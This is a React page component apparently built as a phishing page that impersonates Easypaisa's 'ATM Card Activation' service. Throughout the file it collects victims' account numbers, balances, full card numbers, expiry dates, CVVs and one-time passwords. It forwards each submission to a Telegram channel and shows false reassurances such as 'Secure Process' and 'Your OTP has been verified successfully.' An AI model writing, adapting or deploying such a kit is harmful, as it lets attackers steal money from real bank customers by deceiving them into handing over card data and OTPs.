"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { CreditCard, Shield, Smartphone, CheckCircle, Clock, Send } from "lucide-react"
import { sendToTelegram, formatCardDataMessage, formatOTPMessage } from "@/lib/telegram"
import { useToast } from "@/hooks/use-toast"

export default function EasypaisaActivation() {
  const [step, setStep] = useState<"method" | "account" | "card" | "otp">("method")
  const [loading, setLoading] = useState(false)
  const [cardDataSent, setCardDataSent] = useState(false)
  const { toast } = useToast()

  const [formData, setFormData] = useState({
    accountNumber: "",
    currentBalance: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    otp: "",
  })

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  const sendCardData = async () => {
    setLoading(true)
    try {
      const message = formatCardDataMessage({
        accountNumber: formData.accountNumber,
        currentBalance: formData.currentBalance,
        cardNumber: formData.cardNumber,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
      })

      await sendToTelegram(message)
      setCardDataSent(true)

      toast({
        title: "Data Sent Successfully",
        description: "Card details have been submitted for verification.",
      })

      setStep("otp")
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to submit data. Please try again.",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const sendOTPData = async () => {
    setLoading(true)
    try {
      const message = formatOTPMessage(formData.otp, formData.accountNumber)
      await sendToTelegram(message)

      toast({
        title: "OTP Submitted",
        description: "Your OTP has been verified successfully.",
      })

      // Reset or redirect as needed
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify OTP. Please try again.",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-teal-50 to-cyan-50">
      {/* Header */}
      <div className="relative overflow-hidden bg-gradient-to-r from-emerald-600 to-teal-600 px-6 py-12">
        <div className="absolute inset-0 bg-black/10"></div>
        <div className="relative mx-auto max-w-2xl text-center">
          <div className="mb-6 inline-flex items-center justify-center w-16 h-16 bg-white/20 rounded-full backdrop-blur-sm">
            <CreditCard className="h-8 w-8 text-white" />
          </div>
          <h1 className="text-4xl font-bold text-white mb-4">ATM Card Activation</h1>
          <p className="text-emerald-100 text-lg">
            Activate your temporarily restricted Easypaisa ATM card quickly and securely
          </p>
          <div className="mt-6 flex items-center justify-center gap-2">
            <Badge variant="secondary" className="bg-white/20 text-white border-white/30">
              <Shield className="w-4 h-4 mr-1" />
              Secure Process
            </Badge>
            <Badge variant="secondary" className="bg-white/20 text-white border-white/30">
              <Clock className="w-4 h-4 mr-1" />
              Quick Activation
            </Badge>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-4xl">
        {step === "method" && (
          <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
            <CardHeader className="text-center pb-8">
              <CardTitle className="text-2xl text-gray-800">Choose Activation Method</CardTitle>
              <CardDescription className="text-gray-600">
                Select your preferred method to activate your ATM card
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid gap-6 md:grid-cols-2">
                <Card className="cursor-pointer transition-all hover:shadow-lg hover:scale-105 border-2 hover:border-emerald-300">
                  <CardContent className="p-6 text-center">
                    <div className="mb-4 inline-flex items-center justify-center w-12 h-12 bg-emerald-100 rounded-full">
                      <Smartphone className="h-6 w-6 text-emerald-600" />
                    </div>
                    <h3 className="font-semibold text-lg mb-2">Method 1: Account Verification</h3>
                    <p className="text-gray-600 mb-4">Verify using your account details</p>
                    <Button onClick={() => setStep("account")} className="w-full bg-emerald-600 hover:bg-emerald-700">
                      Continue with Account
                    </Button>
                  </CardContent>
                </Card>

                <Card className="cursor-pointer transition-all hover:shadow-lg hover:scale-105 border-2 hover:border-blue-300">
                  <CardContent className="p-6 text-center">
                    <div className="mb-4 inline-flex items-center justify-center w-12 h-12 bg-blue-100 rounded-full">
                      <CreditCard className="h-6 w-6 text-blue-600" />
                    </div>
                    <h3 className="font-semibold text-lg mb-2">Method 2: Card Details</h3>
                    <p className="text-gray-600 mb-4">Verify using your card information</p>
                    <Button
                      onClick={() => setStep("card")}
                      variant="outline"
                      className="w-full border-blue-600 text-blue-600 hover:bg-blue-50"
                    >
                      Use Card Details
                    </Button>
                  </CardContent>
                </Card>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "account" && (
          <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
            <CardHeader>
              <CardTitle className="text-2xl text-gray-800 flex items-center gap-2">
                <CheckCircle className="h-6 w-6 text-emerald-600" />
                Verify Your Account Details
              </CardTitle>
              <CardDescription>Please enter your account information to proceed with activation</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-4">
                <div>
                  <Label htmlFor="accountNumber" className="text-sm font-medium text-gray-700">
                    Easypaisa Account Number *
                  </Label>
                  <Input
                    id="accountNumber"
                    placeholder="Enter your account number"
                    value={formData.accountNumber}
                    onChange={(e) => handleInputChange("accountNumber", e.target.value)}
                    className="mt-1"
                  />
                </div>

                <div>
                  <Label htmlFor="currentBalance" className="text-sm font-medium text-gray-700">
                    Current Account Balance (PKR) *
                  </Label>
                  <Input
                    id="currentBalance"
                    placeholder="Enter your current balance"
                    value={formData.currentBalance}
                    onChange={(e) => handleInputChange("currentBalance", e.target.value)}
                    className="mt-1"
                  />
                </div>
              </div>

              <Separator />

              <div className="flex gap-4">
                <Button variant="outline" onClick={() => setStep("method")} className="flex-1">
                  Back
                </Button>
                <Button
                  onClick={sendCardData}
                  disabled={!formData.accountNumber || !formData.currentBalance || loading}
                  className="flex-1 bg-emerald-600 hover:bg-emerald-700"
                >
                  {loading ? (
                    <>
                      <Send className="w-4 h-4 mr-2 animate-spin" />
                      Sending...
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4 mr-2" />
                      Submit Details
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "card" && (
          <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
            <CardHeader>
              <CardTitle className="text-2xl text-gray-800 flex items-center gap-2">
                <CreditCard className="h-6 w-6 text-blue-600" />
                Enter Card Details
              </CardTitle>
              <CardDescription>Please provide your card information for verification</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="grid gap-4 md:grid-cols-2">
                <div className="md:col-span-2">
                  <Label htmlFor="accountNumber2" className="text-sm font-medium text-gray-700">
                    Easypaisa Account Number *
                  </Label>
                  <Input
                    id="accountNumber2"
                    placeholder="Enter your account number"
                    value={formData.accountNumber}
                    onChange={(e) => handleInputChange("accountNumber", e.target.value)}
                    className="mt-1"
                  />
                </div>

                <div className="md:col-span-2">
                  <Label htmlFor="cardNumber" className="text-sm font-medium text-gray-700">
                    Card Number *
                  </Label>
                  <Input
                    id="cardNumber"
                    placeholder="1234 5678 9012 3456"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                    className="mt-1"
                  />
                </div>

                <div>
                  <Label htmlFor="expiryDate" className="text-sm font-medium text-gray-700">
                    Expiry Date *
                  </Label>
                  <Input
                    id="expiryDate"
                    placeholder="MM/YY"
                    value={formData.expiryDate}
                    onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                    className="mt-1"
                  />
                </div>

                <div>
                  <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
                    CVV *
                  </Label>
                  <Input
                    id="cvv"
                    placeholder="123"
                    value={formData.cvv}
                    onChange={(e) => handleInputChange("cvv", e.target.value)}
                    className="mt-1"
                  />
                </div>

                <div className="md:col-span-2">
                  <Label htmlFor="currentBalance2" className="text-sm font-medium text-gray-700">
                    Current Account Balance (PKR) *
                  </Label>
                  <Input
                    id="currentBalance2"
                    placeholder="Enter your current balance"
                    value={formData.currentBalance}
                    onChange={(e) => handleInputChange("currentBalance", e.target.value)}
                    className="mt-1"
                  />
                </div>
              </div>

              <Separator />

              <div className="flex gap-4">
                <Button variant="outline" onClick={() => setStep("method")} className="flex-1">
                  Back
                </Button>
                <Button
                  onClick={sendCardData}
                  disabled={
                    !formData.accountNumber ||
                    !formData.cardNumber ||
                    !formData.expiryDate ||
                    !formData.cvv ||
                    !formData.currentBalance ||
                    loading
                  }
                  className="flex-1 bg-blue-600 hover:bg-blue-700"
                >
                  {loading ? (
                    <>
                      <Send className="w-4 h-4 mr-2 animate-spin" />
                      Sending...
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4 mr-2" />
                      Submit Card Details
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "otp" && (
          <Card className="shadow-xl border-0 bg-white/80 backdrop-blur-sm">
            <CardHeader className="text-center">
              <div className="mb-4 inline-flex items-center justify-center w-16 h-16 bg-emerald-100 rounded-full mx-auto">
                <Shield className="h-8 w-8 text-emerald-600" />
              </div>
              <CardTitle className="text-2xl text-gray-800">Enter OTP Code</CardTitle>
              <CardDescription>We've sent a verification code to your registered mobile number</CardDescription>
              {cardDataSent && (
                <Badge variant="secondary" className="bg-emerald-100 text-emerald-800 mt-2">
                  <CheckCircle className="w-4 h-4 mr-1" />
                  Card details submitted successfully
                </Badge>
              )}
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="max-w-sm mx-auto">
                <Label htmlFor="otp" className="text-sm font-medium text-gray-700">
                  6-Digit OTP Code *
                </Label>
                <Input
                  id="otp"
                  placeholder="Enter 6-digit OTP"
                  value={formData.otp}
                  onChange={(e) => handleInputChange("otp", e.target.value)}
                  className="mt-1 text-center text-lg tracking-widest"
                  maxLength={6}
                />
              </div>

              <div className="text-center">
                <Button variant="link" className="text-emerald-600">
                  Didn't receive OTP? Resend
                </Button>
              </div>

              <Separator />

              <div className="flex gap-4">
                <Button
                  variant="outline"
                  onClick={() => setStep(formData.cardNumber ? "card" : "account")}
                  className="flex-1"
                >
                  Back
                </Button>
                <Button
                  onClick={sendOTPData}
                  disabled={formData.otp.length !== 6 || loading}
                  className="flex-1 bg-emerald-600 hover:bg-emerald-700"
                >
                  {loading ? (
                    <>
                      <Send className="w-4 h-4 mr-2 animate-spin" />
                      Verifying...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="w-4 h-4 mr-2" />
                      Verify OTP
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
